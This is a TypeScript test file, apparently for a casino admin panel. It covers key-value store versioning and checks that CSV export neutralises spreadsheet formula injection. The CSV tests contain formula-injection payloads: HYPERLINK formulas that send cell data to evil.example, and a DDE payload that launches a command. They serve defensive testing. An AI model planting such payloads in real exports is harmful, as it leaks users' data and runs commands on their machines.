    const u = await createUser(app, { roleId: 'superadmin' })
    jar = await sessionCookie(app, u.id, 'active')
    expect((await call(app, 'GET', '/api/kv/campanhas.promocoes', { cookie: jar })).json()).toMatchObject({ stored: false, version: 0 })

    // lista de registros passada como valor ou como gerador (como as telas fazem): vazia
    expect(await loadFresh('campanhas.promocoes', [{ id: 'promo-demo', name: 'Promoção de demonstração' }])).toEqual([])
    expect(await loadFresh('campanhas.jornadas', () => [{ id: 'jornada-demo' }])).toEqual([])
    // chave que o servidor só semeia com DEMO_DATA (instalação sem demonstração): vazia, não o gerador do painel
    expect(await loadFresh('esportes.apostas', seedSportsBets)).toEqual([])
    // objeto de configuração: o padrão da tela vale
    const defaults = { enabled: true, horario: '08:00-22:00' }
    expect(await loadFresh('config.suporte', defaults)).toEqual(defaults)
    // configuração cuja demonstração tem segredos DEMO: o valor limpo registrado pelo gerador
    const creds = await loadFresh('cassino.sportsbook-credenciais', seedSportsbookCredentials)
    expect(creds).toMatchObject({ platformId: '', publicKey: '', privateKey: '', webhookSecret: '' })
    expect(JSON.stringify(creds)).not.toContain('DEMO')
    // nada foi gravado só por ler
    expect(puts).toEqual([])
  })

  it('a primeira gravação envia a versão 0: grava se ninguém gravou antes; se alguém gravou, 409 e nada é sobrescrito', async () => {
    const u = await createUser(app, { roleId: 'superadmin' })
    const other = await createUser(app, { roleId: 'superadmin', name: 'Outra pessoa' })
    jar = await sessionCookie(app, u.id, 'active')

    // ninguém gravou: o PUT leva a versão 0 e grava a versão 1
    const KEY = 'campanhas.jornadas'
    expect(await loadFresh(KEY, [])).toEqual([])
    expect(await store.dbSetAndWait<{ id: string }[]>(KEY, (prev) => [...prev, { id: 'j1' }])).toBe(true)
    expect(puts).toEqual([{ url: `/api/kv/${KEY}`, body: { value: [{ id: 'j1' }], version: 0 } }])
    expect((await call(app, 'GET', `/api/kv/${KEY}`, { cookie: jar })).json()).toMatchObject({ stored: true, version: 1, value: [{ id: 'j1' }] })

    // a tela leu "nunca gravada" (versão 0); outra pessoa grava antes; a gravação desta tela é recusada
    const RACE = 'cassino.vitrines'
    expect(await loadFresh(RACE, [{ id: 'vt-demo' }])).toEqual([])
    const theirs = [{ id: 'vt-real', name: 'Gravada por outra pessoa' }]
    const otherCookie = await sessionCookie(app, other.id, 'active')
    expect((await call(app, 'PUT', `/api/kv/${RACE}`, { cookie: otherCookie, body: { value: theirs, version: 0 } })).statusCode).toBe(200)
    puts.length = 0
    expect(await store.dbSetAndWait<{ id: string }[]>(RACE, (prev) => [...prev, { id: 'vt-mine' }])).toBe(false)
    expect(puts).toEqual([{ url: `/api/kv/${RACE}`, body: { value: [{ id: 'vt-mine' }], version: 0 } }])
    // o valor do servidor continua o da outra pessoa, e a tela recarregou para ele
    expect((await call(app, 'GET', `/api/kv/${RACE}`, { cookie: jar })).json()).toMatchObject({ version: 1, value: theirs })
    expect(store.dbGet(RACE, [])).toEqual(theirs)
  })

  it('leitura que falhou: lista vazia e só leitura; a gravação recusada lê de novo e, com o servidor de volta, libera a chave', async () => {
    const u = await createUser(app, { roleId: 'superadmin' })
    jar = await sessionCookie(app, u.id, 'active')
    const KEY = 'campanhas.popups-inbox.inbox'
    failRequest = (method, url) => (method === 'GET' && url === `/api/kv/${KEY}` ? 503 : null)
    expect(await loadFresh(KEY, [{ id: 'msg-demo', title: 'Mensagem de demonstração' }])).toEqual([])
    expect(store.isLoadFailed(KEY)).toBe(true)

    // nada é gravado sobre o padrão: nem atualização, nem valor inteiro; cada recusa tenta ler de novo
    sent.length = 0
    expect(await store.dbSetAndWait<{ id: string }[]>(KEY, (prev) => [...prev, { id: 'msg-1' }])).toBe(false)
    expect(await store.dbSetAndWait(KEY, [{ id: 'msg-2' }])).toBe(false)
    store.dbSet(KEY, [{ id: 'msg-3' }])
    expect(puts).toEqual([])
    expect(sent.filter((r) => !r.startsWith('GET '))).toEqual([])
    expect(sent).toContain(`GET /api/kv/${KEY}`)
    await store.refreshKey(KEY) // a leitura pedida pela recusa ainda dá 503
    expect(store.isLoadFailed(KEY)).toBe(true)
    expect(store.dbGet(KEY, [])).toEqual([])

    // o servidor volta: a leitura dá certo e a chave aceita gravar (versão 0: nunca gravada)
    failRequest = null
    await store.refreshKey(KEY)
    expect(store.isLoadFailed(KEY)).toBe(false)
    expect(await store.dbSetAndWait<{ id: string }[]>(KEY, (prev) => [...prev, { id: 'msg-4' }])).toBe(true)
    expect(puts).toEqual([{ url: `/api/kv/${KEY}`, body: { value: [{ id: 'msg-4' }], version: 0 } }])
  })
})

// ---------------------------------------------------------------------------
// r1-frontend-5: exportação CSV do painel neutraliza fórmulas de planilha
// (antes: server/test/poc-r1-frontend-5.test.ts)
// ---------------------------------------------------------------------------

const FORMULA_NICK = '=HYPERLINK("https://evil.example/c?d="&A2&B2,"Ver detalhes")'
const FORMULA_TAG = '=HYPERLINK("//e.co/?"&B2&C2,"ver")'
const FORMULA_CODE = '=HYPERLINK("https://evil.example/?"&A3,"X")'
/** célula (com ou sem aspas) que a planilha avaliaria como fórmula */
const dangerous = /^"?[\s ]*[=+\-@\t\r＝＋－＠]/

function cellsOf(csv: string): string[][] {
  // CSV simples com ";" (sem ";" dentro dos valores deste teste)
  return csv.split('\r\n').map((l) => l.split(';'))
}

/** valor da célula como a planilha lê (sem as aspas do CSV) */
function unquote(cell: string) {
  return cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell
}

describe('exportação CSV do painel (src/lib/csv)', () => {
  it('apelido, etiqueta, código de cupom e jogador do saque com fórmula saem como texto', () => {
    // mesmas colunas do painel: Usuarios.tsx (nickname, tags), Cupons.tsx (code via sortValue), Saques.tsx (playerName via sortValue)
    const players = [{ id: '1001', nickname: FORMULA_NICK, tags: [FORMULA_TAG] }]
    const usuariosCsv = toCsv(players, [
      { header: 'ID', value: (p) => p.id },
      { header: 'Apelido', value: (p) => p.nickname },
      { header: 'Etiquetas', value: (p) => p.tags.join(', ') },
    ])
    const cuponsCsv = toCsv([{ code: FORMULA_CODE }], [{ header: 'Código', value: (c) => c.code }])
    const saquesCsv = toCsv([{ playerName: '@SUM(1+1)*cmd|\' /C calc\'!A0', amount: -150.5 }], [
      { header: 'Jogador', value: (w) => w.playerName },
      { header: 'Valor', value: (w) => w.amount },
    ])

    const [, playerRow] = cellsOf(usuariosCsv)
    const [, couponRow] = cellsOf(cuponsCsv)
    const [, saqueRow] = cellsOf(saquesCsv)
    expect(playerRow[1]).not.toMatch(dangerous)
    expect(playerRow[2]).not.toMatch(dangerous)
    expect(couponRow[0]).not.toMatch(dangerous)
    expect(saqueRow[0]).not.toMatch(dangerous)
    // o texto continua inteiro (só ganha o apóstrofo na frente)
    expect(unquote(playerRow[1])).toBe(`'${FORMULA_NICK}`)
    // números de verdade não mudam (valor negativo continua número)
    expect(saqueRow[1]).toBe('-150,50')
    // mesmo comportamento do CSV da auditoria no servidor
    expect(serverCsvCell(FORMULA_NICK)).not.toMatch(dangerous)
  })

  it('neutraliza = + - @ tabulação, CR, largura total e espaços antes; mantém números e aspas', () => {
    for (const payload of ['=1+1', '+1+1', '-1+A1', '@SUM(A1:A2)', '\t=1+1', '\r=1+1', '＝1+1', '＋1', '－1+A1', '＠A1', ' =1+1', ' =1']) {
      const cell = panelCsvCell(payload)
      expect(cell, JSON.stringify(payload)).not.toMatch(dangerous)
      expect(unquote(cell).startsWith("'"), JSON.stringify(payload)).toBe(true)
    }
    // números e texto numérico: nada muda
    expect(panelCsvCell(-10.5)).toBe('-10,50')
    // r1: valores em reais com duas casas ("827,10", "189.496,67"); inteiro como está
    expect(panelCsvCell(1234.5)).toBe('1.234,50')
    expect(panelCsvCell(189496.666)).toBe('189.496,67')
    expect(panelCsvCell(42)).toBe('42')
    expect(panelCsvCell('-10,50')).toBe('-10,50')
    expect(panelCsvCell('+5')).toBe('+5')
    expect(panelCsvCell('-3.5%')).toBe('-3.5%')
    // texto comum e aspas/separador como antes
    expect(panelCsvCell('Maria Silva')).toBe('Maria Silva')
    expect(panelCsvCell('a;b')).toBe('"a;b"')
    expect(panelCsvCell('=A1;"x"')).toBe(`"'=A1;""x"""`)
    expect(panelCsvCell(null)).toBe('')
    expect(panelCsvCell(undefined)).toBe('')
  })
})
